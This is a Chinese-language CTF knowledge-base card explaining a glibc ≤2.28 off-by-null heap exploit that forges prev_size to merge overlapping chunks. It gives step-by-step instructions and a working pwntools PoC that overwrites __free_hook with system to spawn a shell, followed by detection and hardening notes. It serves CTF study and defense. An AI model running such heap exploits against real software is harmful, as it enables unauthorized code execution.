---
id: binary-pwn-heap-glibc228-offby-null-prev-size-unlink-overlap
title: glibc ≤2.28 off-by-null：伪造 prev_size 指向已释放 chunk，利用 unlink 检查缺陷合并出重叠 unsorted chunk
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc228-offby-null-prev-size-unlink-overlap
aliases:
- 低版本 off-by-null
- off-by-null unlink
- prev_size 伪造
- chunksize vs prev_size
- glibc 2.27 off-by-null
- hgame week3 你满了那我就漫出来了
- can_you_find_me
- onebook
tags:
- pwn
- heap
- glibc-2.27
- off-by-null
- unlink
- prev-size
- tcache
- unsorted-bin
- free-hook
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc ≤2.28（原文对比：2.28 及之前 consolidate backward 无 chunksize(p)!=prevsize 检查；例题 libc 2.27）
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T00:52:08+08:00'
  notes: 已对照原文与 img/01 核对：add 读取 size<=0xFF 后 read(0,buf,size) 且 *(buf+read_len)=0，为 off-by-null 写入点；glibc<=2.28 consolidate backward 缺 chunksize(p)!=prevsize 检查、unlink 的 next_chunk(P) 检查因 chunk1 已释放而通过；chunk0(0x100)+chunk1(0x70)+chunk2(0x100)=0x270 unsorted 重叠、0x3ebca0 泄露偏移、fastbin->tcache dup->__free_hook 的 exp 均与原文一致。DASCTF/onebook 作为同原语变体并入正文，未单独成卡。未在本机复跑。dedup 候选 2.35 off-by-null/2.32+ House of Einherjar/2.23 unsafe unlink 均为不同版本与检查点，非同链。
---

## 一句话结论

在 glibc ≤2.28 中，`_int_free` 的 consolidate backward 只有 `p = chunk_at_offset(p, -prev_size); unlink_chunk(p)`，没有新版本加入的 `chunksize(p) != prevsize` 检查；而 unlink 宏里的 `chunksize(P) != prev_size(next_chunk(P))` 检查又因为 P=chunk0 的物理后继正好是已释放的 chunk1 而通过。攻击者用 off-by-null 清掉 chunk2 的 PREV_INUSE，把 chunk2 的 prev_size 伪造成 0x170，`free(chunk2)` 就会回退到 chunk0 并 unlink，把 chunk0/1/2 合并成 0x270 的 unsorted chunk，形成覆盖 chunk1 的 overlapping chunk；随后利用 chunklist 中重复指针、unsorted bin 切割写 tcache fd、fastbin double free 转 tcache dup 等原语，最终把 `__free_hook` 改成 `system` 并 `free("/bin/sh")`。

## 原理

- **off-by-null 的写入点**：`add` 在 `read(0, buf, size)` 后执行 `buf[read_len] = 0`。若请求 `0xF8`，chunk 实际 size 为 `0x101`（用户可用 0xF8，下一 chunk 的 prev_size 在用户区 +0x60、size 在 +0x68）；当 read 恰好读满 0xF8 字节时，第 0xF9 个字节（偏移 0xF8）落在下一 chunk 的 size 最低字节，写 0 使 `0x101 → 0x100`，清除 PREV_INUSE 但不改变 size 数值（低字节本来就是 0x00 的场景，例如 0xF8/0x1F8 请求）。
- **unlink 检查的形状**：`unlink(AV,P,BK,FD)` 先检查 `chunksize(P) != prev_size(next_chunk(P))`，然后检查 `FD->bk == P && BK->fd == P`。若 P 是 chunk0，而 chunk0 已释放、chunk1 也刚被释放，则 `next_chunk(chunk0)` 就是 chunk1；chunk1 的 `prev_size` 保存的是 chunk0 的真实 chunk size，所以第一个检查自然成立——攻击者不需要伪造 P 的 size 与 prev_size 一致。
- **低版本缺少的检查**：在 ≤2.28 的 consolidate backward 中，代码直接按 `p->prev_size` 回退并 `unlink_chunk(p)`，没有 `if (chunksize(p) != prevsize) malloc_printerr("corrupted size vs. prev_size while consolidating");`。因此 chunk2 的 prev_size 可以指向并不与它相邻的 chunk0，只要 chunk0 已释放且其 `next_chunk`（=chunk1）的 prev_size 与 chunk0 的真实大小一致即可通过 unlink。
- **合并出重叠块**：先 free(0)、free(1)，再在 chunk1 的用户区写入 `prev_size=0x170` 并对 chunk2 做 off-by-null；`free(2)` 时按 prev_size=0x170 回退到 chunk0（0x100 的 chunk0 + 0x70 的 chunk1 = 0x170），unlink chunk0 后得到从 chunk0 开始、覆盖 chunk1/2 的 0x270 unsorted chunk。之后从该 unsorted chunk 切出 0x70 的块，就会与 chunk1 的用户区重叠。
- **重复 chunk 指针**：由于 chunk1 和 chunk3 都指向被重叠区域中的同一个 0x70 chunk，`add(1)` 实际等价于 `edit(3)`，给了攻击者一个稳定的编辑原语，可反复修改仍挂在 tcache/fastbin 中的 chunk。
- **fastbin double free 转 tcache dup**：注意不能直接对同一 chunk 做 tcache double free——第二次 free 时 chunk 已在 tcache，`key` 检查会报 `double free detected in tcache 2`。先把 chunk3、chunk12、chunk1（其中 1 与 3 是同一块）按顺序 free 进 fastbin，形成 `1 -> 12 -> 3` 的重复链；随后 `add` 把 fastbin 的 chunk 倒灌进 tcache，同一个 chunk 在 tcache 中出现两次，实现 tcache dup；再写 `__free_hook` 的 fd，分配出 `__free_hook` 并写入 `system`。
- **其他利用面**：unsorted bin 的 fd 指向 libc 附近，切割 unsorted bin 时 `read` 会写到仍在 tcache 中的 chunk，等于对 tcache chunk 的 fd 做编辑，可直接 tcache poison；也可覆盖 `_IO_2_1_stdout_` 低字节构造 fake FILE 泄露 libc；若程序不限制 size，可以直接用 unsorted bin 重叠后写 `__free_hook`，无需先填满 tcache。
- **为什么成立**：低版本把“prev_size 与物理前驱大小一致”的校验放在 unlink 的 `next_chunk(P)` 上，而不是 consolidation 的 `chunk_at_offset` 结果上；只要攻击者能让 P 的 next_chunk 指向一个已释放的、prev_size 正确的真实 chunk，就能把 prev_size 指到任意更早的已释放 chunk，制造出跨多个 chunk 的合并/重叠。

## 触发条件

- 目标 glibc ≤2.28（原文例题 libc 2.27；tcache 已存在，但没有 consolidate-backward 的 `chunksize(p) != prevsize` 检查）。
- 程序存在 off-by-null（常见的 `buf[read_len] = 0`），且能控制被溢出 chunk 的 `prev_size`（通过前一个 chunk 的用户区末尾写入）。
- 能在触发溢出前先 free 两个相邻 chunk（chunk0、chunk1），使 `next_chunk(chunk0)=chunk1` 且 chunk1 的 prev_size 等于 chunk0 的真实大小。
- 能申请 size 使 chunk size 低字节为 0x00（如 0xF8、0x1F8），或目标 chunk 的 size 低字节恰好可被清 0 而不破坏大小。
- 有 show/edit 接口或 chunklist 重复指针，能把重叠块转化为泄露与任意写；已知 libc 版本/偏移以便打 `__free_hook`。

## 利用步骤

1. 布置堆：`add(0,0xF8)`、`add(1,0x68)`、`add(2,0xF8)`，再申请 3..9 的 0xF8 块和 12 的 0x68 块，为后续填 tcache/隔离做准备。
2. 释放 3..9 填满 0x70/0xF8 相关 tcache；`delete(0)`、`delete(1)`，让 chunk0 与 chunk1 处于释放状态，chunk1 的 prev_size 记录 chunk0 的大小。
3. 用 `add(1,0x68, b'a'*0x60 + p64(0x170))` 同时完成两件事：把 chunk2 的 prev_size 写成 0x170；read 写满后 `buf[0x68]=0` 清掉 chunk2 的 PREV_INUSE（0x101→0x100）。
4. `delete(2)`：低版本 backward consolidation 按 prev_size=0x170 回退到 chunk0，unlink 通过；chunk0/1/2 合并成 0x270 unsorted chunk。
5. `add(0,0x70)`、`add(2,0x70)` 从 unsorted chunk 切块；`show(1)` 读重叠区，`fd` 指向 main_arena 附近，算 `libc_base = leak - 0x3ebca0`（2.27 示例偏移）。
6. `add(3,0x68)` 使 chunklist[1] 与 chunklist[3] 指向同一个 chunk，获得 `add(1)`≈`edit(3)` 的别名写。
7. 构造 fastbin/tcache dup：填满 0x70 tcache 后按 `delete(3); delete(12); delete(1)` 让 fastbin 链出现重复 chunk1/3；`add` 把 fastbin 倒灌进 tcache，形成 tcache dup。
8. `add(1,0x68,p64(__free_hook))` 改写 tcache fd；分配出 `__free_hook` 并写入 `system`；再申请一块内容为 `/bin/sh` 的 chunk 并 `delete` 它，触发 `system("/bin/sh")`。

## PoC

原文 hgame week3 例题的关键段（libc 2.27，偏移按目标 libc 核对）：

```python
add(0, 0xF8, b'a')
add(1, 0x68, b'a')
add(2, 0xF8, b'a')
for i in range(3, 10):
    add(i, 0xF8, b'a')
add(12, 0x68, b'a')
for i in range(3, 10):
    delete(i)
delete(0)
delete(1)

# 同时写 chunk2 的 prev_size=0x170 并 off-by-null 清 PREV_INUSE
add(1, 0x68, b'a' * 0x60 + p64(0x170))
delete(2)                       # 向后合并 chunk0/1/2 -> 0x270 unsorted

add(0, 0x70, b'a')
add(2, 0x70, b'a')
show(1)                         # 从重叠的 unsorted 区泄露 libc
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebca0
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

add(3, 0x68, b'a')              # chunklist[1] 与 [3] 指向同一 chunk
for i in range(4, 11):
    add(i, 0x68, b'a')
for i in range(4, 11):
    delete(i)                   # 填满 0x70 tcache

delete(3)                       # fastbin: 3
delete(12)                      # fastbin: 12 -> 3
delete(1)                       # fastbin: 1 -> 12 -> 3（1 与 3 同一块）
for i in range(4, 11):
    add(i, 0x68, b'a')          # 把 fastbin 倒灌进 tcache，形成 tcache dup

add(1, 0x68, p64(free_hook))    # 改写 tcache fd
add(3, 0x68, b'/bin/sh\x00')
add(13, 0x68, b'a')
add(12, 0x68, p64(system_addr)) # __free_hook = system
delete(3)                       # free("/bin/sh") -> system("/bin/sh")
p.interactive()
```

> 说明：0x3ebca0 为原文 libc 2.27 的 main_arena 相关偏移；不同 libc 需重算。原文还给出两条例题变体：DASCTF can_you_find_me 用 off-by-null 造 unsorted bin + 覆盖 stdout 低字节泄露 libc 后 tcache poison；CISCN2024 华北 onebook 不限制 size，直接用 unsorted bin 重叠写 `__free_hook`。未在本机复跑。

## 变体与关联

- **High-version 对照**：[[binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop]] 是 glibc 2.35 的 off-by-null + 高版本 unlink：新版本增加了 `chunksize(p) != prevsize` 检查，必须伪造 fake chunk 的 size 与 prev_size 一致，并把 fd/bk 锚定到全局 chunk 数组；本卡利用 ≤2.28 缺少该检查，prev_size 可指向真实的已释放 chunk，触发条件与伪造方式不同。
- **House of Einherjar 对照**：[[binary-pwn-heap-house-of-einherjar-offby-null-fake-chunk-tcache-poison]] 用自指 fake chunk + `chunksize(fake)==prev_size` 通过 2.32+ 的检查，再 tcache poison；本卡在低版本用真实 chunk0 作为回退目标，无需 fake chunk 自指。
- **同类 off-by-one 变体**：[[binary-pwn-heap-newline-size-diff-0xa-offbyone-prev-inuse-overlap]] 通过换行符长度差多写 1 字节清 PREV_INUSE 造 unsorted overlap；[[binary-pwn-heap-fake-unsorted-chunk-prev-inuse-merge-bypass]] 讨论伪造 unsorted chunk 时如何用下下个 chunk 的 PREV_INUSE 跳过合并检查。
- **利用面变体**：重复 chunklist 指针 → `add` 当 `edit`；unsorted fd 附近 libc + 切割写 tcache fd；fastbin dup 倒灌 tcache；stdout 低字节 fake FILE；不限制 size 时直接 unsorted bin 重叠。
- **其他低版本 unlink**：[[binary-pwn-heap-glibc223-unsafe-unlink-chunks-array-got-system]] 是 2.23 的经典 unsafe unlink 打 chunks 数组/GOT，本卡是 off-by-null + prev_size 的变体。
- 边界：glibc >2.28 增加 consolidate-backward 检查后本链失效；tcache key/safe-linking 会改变后续 dup/poison 的写法；没有 off-by-null 或无法控制 prev_size 时不成立。

## 检测与防御

- 代码审计：查找 `read(...); buf[read_len] = 0;`、`strcpy`/`strcat` 后手动补 NUL 等 off-by-null 模式；确保写入长度小于 chunk 可用空间，或改用带长度限制的拷贝。
- 加固：升级 glibc >2.28（加入 `chunksize(p) != prevsize while consolidating` 检查）；启用 tcache key、safe-linking、Full RELRO/PIE/Canary；开启 MALLOC_CHECK_/堆完整性检测。
- 检测：`corrupted size vs. prev_size`/`corrupted double-linked list`/`double free detected in tcache` 等 glibc 报错；同一 chunk 同时出现在 unsorted bin 与 tcache；chunklist 中出现重复指针；`__free_hook` 被改写为 libc 函数地址。
- 该场景为 CTF/授权测试利用；生产环境不能依赖“请求 size 小于 0x100”作为安全边界，off-by-null 在高版本也可能通过其他检查路径被利用。
